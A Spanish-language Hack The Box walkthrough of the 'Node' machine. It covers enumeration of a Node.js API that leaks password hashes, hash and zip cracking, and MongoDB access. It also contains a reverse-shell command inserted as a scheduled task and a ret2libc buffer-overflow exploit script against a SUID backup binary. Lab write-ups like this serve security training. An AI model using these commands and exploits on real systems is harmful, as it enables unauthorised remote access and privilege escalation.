# Node-HTB

Esta es la resolucion de la maquina Node

## NMAP

Solo tiene dos puertos abiertos el 22 y el 3000

```
sudo nmap -sSVC -p22,3000 -vvv 10.129.75.0 -oN scan

PORT     STATE SERVICE
22/tcp   open  ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) (Ubuntu 16.04.7 LTS (Xenial Xerus)

3000/tcp open  ppp hadoop-datanode syn-ack ttl 63 Apache Hadoop


```

Ya sabes con eso basta para enumerar con que Ubuntu estamos trabajando.

## WHATWEB

Hay que intentar enumerar con lo que se pueda para saber a que nos estamos enfrentando.

```
whatweb http://10.129.74.234:3000/ 
```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/fdf5f69e-a20d-40eb-802f-558fb3d4dc38)


## CURL

Para ver con que estamos tratando lanza un head.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/170e9f88-2dde-4c27-9c5c-4ed64840bc93)


```
curl -I http://10.129.74.234:3000/

```

Toda esta informacion tambien podria verse desde el dev tools de firefox ya que en el oscp no se permite usar.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/defa3833-8160-4aa6-96c0-f44090feedab)

En la peticion se comienza a notar que exiten diferentes rutas dentro de ese servidor.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/956f38dc-45af-4e44-91f9-bf8ff48fa266)

Entonctramos usuarios que se podrian usar como potencial vector de ataque

```
id	"59a7368398aa325cc03ee51d"
username	"tom"
password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
is_admin	false
1	
_id	"59a7368e98aa325cc03ee51e"
username	"mark"
password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
is_admin	false
2	
_id	"59aa9781cced6f1d1490fce9"
username	"rastating"
password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
is_admin	false
```

La ruta que nos dice que hay una api es 

```
http://10.129.74.234:3000/api/users/latest
```

## FFUF

```
ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.75.0:3000/api/FUZZ

```

Siempre es bueno revisar las rutas que tienen la api pasar por ahi con el navegador. Por suerte aqui me aparecio una ruta Users( si con mayusculas). Y al visitarla jalaba mas datos un usuario admin

```
http://10.129.74.234:3000/api/users/

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]

```

## HASHCAT

Tambien tenemos un login en la pagina se crackearon todos los hashes que se entontro:

```
hashid hash

hashcat -m 1400 hash_backup /usr/share/wordlists/rockyou.txt


tom:spongebob
mark:snowflake
rastating:no se pudo
myP14ceAdm1nAcc0uNT:manchester

```

Por la version de SSH se pudo enumerar pero como usa cosas con python 2 manda errores termine haciendolo con metasploit. Mejor intentalo con wfuzz o ffuf.

## fcrackzip vs JTR


![image](https://github.com/gecr07/Node-HTB/assets/63270579/0860137e-a837-4fb9-9ef6-821ca28a6b44)

Esto descarga un archivo que es un backup

```
file

cat file | base64 -d > file_decode
file # Nos dice que es un zip

7z l file
7z x file

## S4VITAR lo hizo asi para dejar todo en el mismo archivo

cat mybackup | base64 -d | sponge mybackup
```

Para crackear el passwd del .zip tenemos dos opciones JTR o fcrackzip.

```
 sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file_backup 


PASSWORD FOUND!!!!: pw == magicword

## S4VITAR

zip2john file.zip > hash # te extrae un hash

john -w rockyou.txt hash
                         
```

Revisamos el app.js y ya de entrada vemos 2 cosas que son como keys mongo es una base de datos NOSQL.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e3335b8f-fd70-4e3f-80c2-2f5a617c2349)


Nos loggeamos con las credenciales de admin que entonctramos hasta aqui ya sabemos varias cosas esta usando NODEJS despues usa de servidor Express tiene una API ya tenemos usuarios validos y un servicio SSH en el puerto 22 toca probar todas las credenciales a ver si una es.

Ya te digo que ninguna credencial de las anteriores servis para inciar session con ssh. Pero si la que encontraste en el archivo.

```
sshpass -p 'passowrd' ssh tom@10.10.10.58 # esto sirve para poder automatizar algun script y probar passwords
```

## ss vs netstat

No en todos los sistemas tienen netstat pero tal parece que si ss

```
ss -ant
-a (de all)  Display both listening and non-listening (for TCP this means established connections) sockets
-n Do not try to resolve service names.
-t Display TCP sockets.

## Shortcut

shift / para buscar
N para atras
n para adelante
g volver a incio
h help 

```


## MONGODB

Para poder conectase a esta base de datos se hace asi:

```
 const url= 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
  12   │ const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

## Conectarse

mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace

```

Para enumerar la base de datos mongo es un poco diferente.En MongoDB, en lugar de "tablas", se utilizan "colecciones". 


```
use myplace
show dbs
show collections
db.users.find()

```

## PSPY

![image](https://github.com/gecr07/Node-HTB/assets/63270579/d5b82dc6-da41-4ceb-b14b-2e2832c9cf93)

Nos damos cuenta y tambien con el linpeas.sh que este usuario no puede hacer nada. Despues que se ejecutan 2 diferentes app.js

```
/usr/bin/node /var/www/myplace/app.js
/usr/bin/node /var/scheduler/app.js

```

Vemos el archivo que esta en scheduler

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e04bb5af-0632-4db2-9363-a66ab9385c68)

> This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the tasks collection. For each doc, it will pass doc.cmd to exec to run it, and then delete the doc.

## RCE

![image](https://github.com/gecr07/Node-HTB/assets/63270579/722f9079-8a48-4d72-bc5b-6261d2264133)


Enumerando todo lo que se pudo se tiene que hacer es intentar volverse el usuario tom. Esta es otra manera de conectase a mongodb.

```
mongo -u mark -p 5AYRft73VtFpc84k scheduler
mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler

show collections

db.tasks.find()

db.tasks.insert({"cmd": "touch /tmp/masa"})

## Reverse shell

 db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.108/1234 0>&1'"})

```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/60b46db4-78d0-4d38-9073-b852408a5da8)

## FULLY TTY

```
script /dev/null -c bash
CTRL + X

stty raw -echo;fg
     reset xterm
export TERM=xtem
export SHELL=/bin/bash
```

> adm means that I can access all the logs, and that’s worth checking out, but admin is more interesting. It’s group id (gid) is above 1000, which means it’s a group created by an admin instead of by the OS, which means it’s custom. Looking for files with this group, there’s only one.


```
find / -type f -perm -4000 -user root 2>/dev/null
```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/4c0e57f1-69cb-4139-8bc5-d34c0a70eac0)


Mismo archivo que ya sabiamos que era SUID con el linpeas.

> Interestingly, this binary is called from /var/www/myplace/app.js


## Dynamic analysis

![image](https://github.com/gecr07/Node-HTB/assets/63270579/1ae3c311-5f20-4903-9e42-bb229c3c0ffd)

Intentamos ver ese archivo que hace nos lo topamos en app.js el normal no el schedule. Tiene 3 archivos y al parecer genera  backups.

```
ltrace a b c

```


## ltrace vs strace

En resumen, ltrace se centra en el seguimiento de llamadas a funciones en bibliotecas compartidas(en windows serian las DLL) mientras que strace se enfoca en el seguimiento de llamadas al sistema realizadas por un programa(en Windows serian las APIs). Ambas herramientas son útiles en diferentes contextos de depuración y pueden proporcionar información valiosa para resolver problemas de programación y rendimiento.

Entonces ya identificamos que backup es una via potencial de ingreso ahora supongamos que no vimos el archivo app.js para saber como funciona esto entonces vamos a usar ltrace.


![image](https://github.com/gecr07/Node-HTB/assets/63270579/ea99fd50-f202-4e4e-8f70-07031af2286a)

Ahora vamos a ver con ltrace que hace. aqui no tenia ni -h ni --help nada. 

![image](https://github.com/gecr07/Node-HTB/assets/63270579/b4aea48f-201a-490f-becf-27f3f6372e19)

Lo primero que esta haciendo es comparar la a con la -q como pusimos una a entonces = 1 falla la comparacion.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/a08d989e-eab3-475b-aeb6-2ba85c542050)

Como ahi si le pusimos la -q no muestra nada nos hace pensar en (-q de quiet). Si nos damos cuenta esta concatenando una cadena y despues esa cadena abre ese archivo (fopen("/etc/myplace/keys", "r")). Nos vamos a ver que tiene eso.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/0a63d063-9ea6-494b-863e-15f06ff2b2c3)

### fgets

La función fgets es una función en el lenguaje de programación C que se utiliza para leer una línea de texto desde un archivo o desde la entrada estándar y almacenarla en un búfer (un arreglo de caracteres). La función fgets se utiliza comúnmente para leer líneas de texto completas, incluyendo el carácter de nueva línea ('\n') que indica el final de la línea.

```C 
#include <stdio.h>

int main() {
    char buffer[100];
    
    printf("Escribe una línea de texto: ");
    
    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
        printf("Línea leída: %s", buffer);
    } else {
        printf("Error al leer la línea.");
    }
    
    return 0;
}
```


### strcmp

strcmp: Función que sirve para comparar dos cadenas de caracteres, si las cadenas son iguales te devolverá un “0”, si la primer cadena es menor que la segunda devolverá un número negativo (en este ejemplo "-1") y finalmente si la primer cadena es mayor que la segunda devolverá un numero positivo("1"). La sintaxis para utilizar la función es la siguiente:

```C

#include <stdio.h>
#include <string.h>

int main() {
    const char *cadena1 = "manzana";
    const char *cadena2 = "naranja";

    int resultado = strcmp(cadena1, cadena2);

    if (resultado == 0) {
        printf("Las cadenas son iguales.\n");
    } else if (resultado < 0) {
        printf("La cadena1 es menor que la cadena2.\n");
    } else {
        printf("La cadena1 es mayor que la cadena2.\n");
    }

    return 0;
}

```
Yo no lo sabia pero strcmp puede comparar cadenas por su posicion alfabeticamente.Compara dos cadenas A y B y devuelve:

-1: Si alfabéticamente A es menor que B

0 : Si son iguales

1 : Si alfabéticamente B es menos que A




### strcspn

La función strcspn en C se utiliza para calcular la longitud de la subcadena inicial de una cadena que no contiene ninguno de los caracteres especificados en un conjunto de caracteres dado. La firma de la función strcspn es la siguiente ( EN ESTE CASO LO QUE VEO ES QUE EL CARACTER QUE BUSCA ES EL \n).

![image](https://github.com/gecr07/Node-HTB/assets/63270579/d044c8be-e6f6-4b22-b672-92adfb0dd218)

Entonces si saca el valor de ese string sin el salto de linea y posteriormente lo compara con nuestra a que meticmos

![image](https://github.com/gecr07/Node-HTB/assets/63270579/1ba60a99-e23e-46a1-a4c3-8e9487b18d46)


Si nos damos cuenta solo esta comparando ese campo ( el segundo)

![image](https://github.com/gecr07/Node-HTB/assets/63270579/337edba2-11fe-4103-b5ef-8bdd8b768c81)

Ahora si ponemos uno de esos strings salen mas cosas:

### strstr

La función strstr en C se utiliza para buscar la primera aparición de una subcadena (substring) en una cadena más larga. La firma de la función strstr es la siguiente:

```C
#include <stdio.h>
#include <string.h>

int main() {
    const char *cadena = "Hola, mundo. ¡Hola a todos!";
    const char *subcadena = "a a";

    char *resultado = strstr(cadena, subcadena);

        printf("Inicio del programa \n");

    if (resultado != NULL) {
        printf("Dentro del if\n");
        printf("Subcadena encontrada: %s\n", resultado);
        printf("\n");
    } else {
        printf("Dentro del else\n");
        printf("Subcadena no encontrada.\n");
        printf("\n");
        }

    return 0;
}

```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/a93b0f6e-f6d7-40d9-9522-63d57cc64c9b)


La función strstr busca la primera ocurrencia de la subcadena en la cadena y devuelve un puntero al comienzo de la primera coincidencia, o devuelve un puntero nulo (NULL) si la subcadena no se encuentra en la cadena.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/8419e99e-5e38-4370-8f01-b4859f0ae1ab)

Por eso devuelve null porque no encuentra ninguna subcadena que comience con esos caracteres.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/c28bdfd1-30d7-4e6c-8553-6defe0b14032)

Entonces en app.js nos damos cuenta como funciona. Si metes root compara y detecta y mete directamente la troll face

![image](https://github.com/gecr07/Node-HTB/assets/63270579/f35faa68-351a-4c94-b8fa-22da1822811b)


![image](https://github.com/gecr07/Node-HTB/assets/63270579/602b7059-18da-408e-992e-2d5828035718)

Entonces mira cuando compara con /root lo que pasa

![image](https://github.com/gecr07/Node-HTB/assets/63270579/0f56f623-acc6-4f1b-98e0-38b4a27d41f0)

Y nos mete la troll face. Una manera de que S4vitar vencio esto es ponerse en el directorio / entonces asi solo llamar con el tercer parametro asi:


```bash

tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 root



```

Y asi vence las validaciones que se hacen antes.


## Buffer overflow

Este es la manera dificil y se emplean funciones que son vulnerables a este ataque. el primer campo sol compara el segundo igual pero al parecer el tecero si podria ser suseptible(yo digo que la vulnerabilidad esta en el strcy por eso los primeros 2 argumetnos no son vulnetables)


```
 ltrace backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python -c 'print("A"*5000)')

```


![image](https://github.com/gecr07/Node-HTB/assets/63270579/bc78bd67-af47-4c88-87ec-66d4a2255273)


Entonces ahi se ve si es vulnerable y por el echo que strcpy ya sabes que lo lo es y no se ve que exista una sanitizacion.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/deee50a2-46f2-4e90-8216-1f2601d8792d)




### GDB

GNU Debugger) es una poderosa herramienta de depuración que se utiliza en sistemas basados en Linux y en otros sistemas Unix. Su función principal es permitir a los desarrolladores inspeccionar y depurar programas escritos en lenguaje C, C++, y otros lenguajes que sean compatibles con GDB

S4vitar nos recomienda instalar como una modificacion a este programa GEF

> https://github.com/hugsy/gef

![image](https://github.com/gecr07/Node-HTB/assets/63270579/4341c149-63f7-4a2d-9570-6b30900fc3f1)

```

gdb ./backup -q

### Para correrte el programa

gef> r a b c

gef> r -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python -c 'print("A"*5000)')

```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/1d55a547-1845-49b1-a661-0e047e5cf300)

Si le quitas el -q y le pones cualquier cosa ahi se ve el registro EIP con AAAA

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e7c39add-c43c-494b-bb79-beaa651332b3)


![image](https://github.com/gecr07/Node-HTB/assets/63270579/e7d89d51-f0fa-4966-b6bb-e76cc734a8c6)


Vamos a revisar que protecciones tiene el binario 

```
gef> checksec

```

> El resultado de un análisis de seguridad (checksec) en un binario proporciona información sobre las características de seguridad habilitadas o deshabilitadas en ese binario. Aquí está el significado de cada uno de los resultados que has obtenido:

### Canary 

 El "canary" (también conocido como "canary value" o "stack canary") es una técnica de seguridad utilizada para proteger contra desbordamientos de búfer y ataques de desbordamiento de pila. Un "canary" es un valor colocado en la pila antes del retorno de una función y se verifica antes de que la función salga para asegurarse de que no ha sido modificado. Si el "canary" se modifica, se trata de un signo de un posible desbordamiento de búfer. En este caso, el binario no tiene la protección de "canary" habilitada (✘), lo que significa que no se utiliza esta técnica de seguridad.


 ### NX o DEP (Data Execution Prevention)

Es una característica de seguridad que evita que las áreas de memoria marcadas como no ejecutables sean ejecutadas. Esta característica ayuda a prevenir la ejecución de código malicioso ubicado en áreas de memoria que no deberían contener código ejecutable.


### PIE (✘): "PIE" significa "Position Independent Executable 

Se refiere a la capacidad de un binario de ejecutarse en ubicaciones de memoria aleatorias. Los binarios con soporte "PIE" son más resistentes a ataques de explotación que se basan en conocer la ubicación exacta de funciones o datos en memoria. En este caso, el binario no es un "ejecutable independiente de la posición" (✘), lo que significa que su carga en memoria es predecible.

## Fortify 

La protección "Fortify" es una característica que ayuda a prevenir desbordamientos de búfer y otros errores comunes de programación al proporcionar funciones seguras en lugar de las funciones tradicionales que pueden ser vulnerables. La ausencia de "Fortify" (✘) significa que el binario no utiliza estas funciones seguras.

## RelRO (Partial): La "RelRO" (Relocation Read-Only)

Es una técnica de protección que hace que las tablas de reubicación sean de solo lectura después de que el binario se haya cargado en memoria. Esto dificulta la explotación de ciertos tipos de vulnerabilidades. La protección "Partial" indica que parte del binario tiene "RelRO" habilitado, pero no toda la imagen del programa.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/00f57e9e-4b2e-4079-8e29-50b7ff686a11)

## ASLR 

En resumen, ASLR es una técnica que aleatoriza la ubicación de bibliotecas y otros segmentos de memoria en tiempo de ejecución a nivel del sistema operativo, mientras que PIE es una característica de los programas ejecutables que los hace independientes de la dirección, permitiendo que se carguen en diferentes ubicaciones de memoria. Ambas técnicas contribuyen a la seguridad de un sistema, pero PIE es una característica específica de los programas, mientras que ASLR es una defensa a nivel del sistema.

## El ataque "ret2libc"


La "libc" (abreviatura de "C Library" o "Biblioteca C" en español) es una biblioteca estándar de programación en el lenguaje de programación C y sus derivados, como C++ y otros. Esta biblioteca proporciona una colección de funciones y rutinas que los programadores utilizan comúnmente en sus programas para realizar tareas básicas, como entrada/salida, manipulación de cadenas, gestión de memoria, operaciones matemáticas, y más.

La libc es una parte fundamental del sistema operativo y se encarga de proporcionar una interfaz consistente y portátil entre las aplicaciones y el sistema operativo subyacente. Contiene funciones que son esenciales para el funcionamiento de los programas y se utilizan ampliamente en todo tipo de software.

El ataque "ret2libc" (retorno a la biblioteca estándar en inglés, "return-to-libc") es una técnica de explotación utilizada en la seguridad informática para aprovechar vulnerabilidades de desbordamiento de búfer en programas. Este ataque es una variante del clásico ataque de desbordamiento de búfer que se utiliza cuando el sistema operativo y las aplicaciones están protegidas contra la ejecución de código malicioso en la pila (DEP/NX) o la pila aleatoria (ASLR). Por lo tanto, en lugar de inyectar y ejecutar directamente código malicioso, los atacantes aprovechan las bibliotecas del sistema ya cargadas en memoria.


Sí, la "libc" o "Biblioteca C" es una biblioteca dinámica en la mayoría de los sistemas operativos basados en Unix, como Linux. La libc es una biblioteca estándar que proporciona funciones esenciales para la programación en el lenguaje de programación C. Estas funciones incluyen operaciones de entrada/salida, manipulación de cadenas, gestión de memoria, operaciones matemáticas y muchas otras funciones comunes.

### ldd 

El comando ldd (abreviatura de "list dynamic dependencies") es una herramienta utilizada en sistemas operativos tipo Unix, como Linux, para mostrar las bibliotecas dinámicas (también conocidas como bibliotecas compartidas o DLL en Windows) requeridas por un programa ejecutable. Las bibliotecas dinámicas son archivos de código compartido que los programas utilizan para acceder a funciones y rutinas comunes, como las proporcionadas por la libc u otras bibliotecas compartidas.


![image](https://github.com/gecr07/Node-HTB/assets/63270579/850d3602-977b-4f03-957f-a76894bdc10d)

![image](https://github.com/gecr07/Node-HTB/assets/63270579/75c1ec0d-4083-4b24-8ffe-b47bc97109b8)


Entonces lo que vamos a hacer es algo como eso de arriba pero con la libreria de libc. Para saber si el ASL esta activado usa:

```
cat /proc/sys/kernel/randomize_va_space
2

for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d "()" ;done

```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/774d6068-60e3-46ff-ab18-92d755ad6ca3)


Como las direcciones de 32 bits son pequeñas alguna veces hay coliciones o se repiten.

```
for i in $(seq 1 10000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d "()" ;done | grep "0xf75d4000"

```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/4138f1c1-5ab1-4068-a017-15e4b2e8594c)

Esto lo que nos permite es burlar el ASL. Mas o menos el flujo de ataque es asi Ret2libc -Z system_addr_off + exit_addr_off + bin_sh_addr

```
Vamos a jugar con el gef

gef> i r # info registers

# Para crear patrones y sacar los numeros exactos de donde se escribe el EIP

gef> pattern create 1000


```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/8613f8ff-7b52-4b1e-b973-414909867af0)

![image](https://github.com/gecr07/Node-HTB/assets/63270579/bb49c00e-eb5f-4b82-a246-32b128e97ac6)

Ahora vamos a sacar el desplazamiento (offset) que tiene ese pattron el cual sobre escribe el EIP.

```
gef> pattern offset $eip

```

Tenemos que escribir 512 AAA (u otro caracter para sobre escribir el EIP)


![image](https://github.com/gecr07/Node-HTB/assets/63270579/0b3455a0-ee17-4cad-8b9f-1539ecbcef94)


```
gef➤  r adsf a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python -c 'print("A"*512 + "MASA")')

```

### Littel Endian(alrrevez de como escribes) vs Big Endian(normal)

#### Byte menos significativo (LSB):
Supongamos que tenemos un byte de 8 bits con los siguientes valores binarios:

LSB (Byte menos significativo) = 01011011

En este caso, el bit en la extrema derecha (1) es el bit menos significativo porque tiene el menor peso en la representación del número. Este bit es el que contribuye menos al valor total del byte.

#### Byte más significativo (MSB):
Ahora, supongamos que tenemos otro byte de 8 bits con los siguientes valores binarios:

MSB (Byte más significativo) = 10010110

El bit en la extrema izquierda (1) es el bit más significativo porque tiene el mayor peso en la representación del número. Este bit es el que contribuye más al valor total del byte.


### Little endian


En sistemas Linux de 32 bits (x86), las direcciones de memoria se representan en el formato "little-endian". Esto significa que los bytes menos significativos se almacenan en las direcciones de memoria más bajas, mientras que los bytes más significativos se almacenan en las direcciones de memoria más altas.

Para entender mejor cómo se representan las direcciones en "little-endian" en un sistema de 32 bits, consideremos un ejemplo:

Supongamos que tenemos una dirección de memoria de 32 bits en hexadecimal, como "0x12345678". En "little-endian", se almacenaría de la siguiente manera:

Byte más bajo (menos significativo) en la dirección más baja: 0x78

Siguiente byte: 0x56

Siguiente byte: 0x34

Byte más alto (más significativo) en la dirección más alta: 0x12


### Exploit

Para sacar los offsets:

```
which backup | xargs ldd
readelf -s /lib32/libc.so.6 # el s es para ver los simbolos de ahi vamos a sacar los offsets o desplazamientos en ese archivo que se le sumaran a lo cargado en memoria.
readelf -s /lib32/libc.so.6 | grep " system"


```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/87bfc99d-4533-4453-8d00-277e465755a5)


Para sacar el offset de /bin/sh

```
strings -a -t x /lib32/libc.so.6

-a ver todos los strings no nada mas de la seccion data que es el comportamiento por default
-t x codificar en modod hex
```
![image](https://github.com/gecr07/Node-HTB/assets/63270579/15c94fed-32ad-4911-82f0-5d7b2993dfca)


```python


from struct import pack # para no tener que darle las direcciones alrrevez tu metelas normla esto lo hace automatico.

offset = 512
junk = "A"*offset


#ret2libc -> EIP -> system_addr + exit_addr + bin_sh_addr # system("/bin/sh") [Libc]

# Cuando hay ASL activado no puedes obtener las direcciones con el GDB porque van a cambiar
# Vamos a aplicar fuerza bruta

libc_base_addr = 0xf75af000

system_addr_off = 0x0003a940
exit_addr_off =  0x0002e7b0
bin_sh_addr_off =0x0015900b

system_addr = pack("<I", libc_base_addr+ system_addr_off)
exit_addr =   pack("<I", libc_base_addr+ exit_addr_off)
bin_sh_addr = pack("<I", libc_base_addr+ bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

print(payload)


#tom@node:/tmp$ readelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"
#  141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
# 1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

#tom@node:/tmp$ strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
#15900b /bin/sh




```

Entonces para ejecutar seria


```
while true;do backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python exploit.py); done
```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e1f3695a-d1fd-47fa-ba89-cef9fde9ebaa)





 


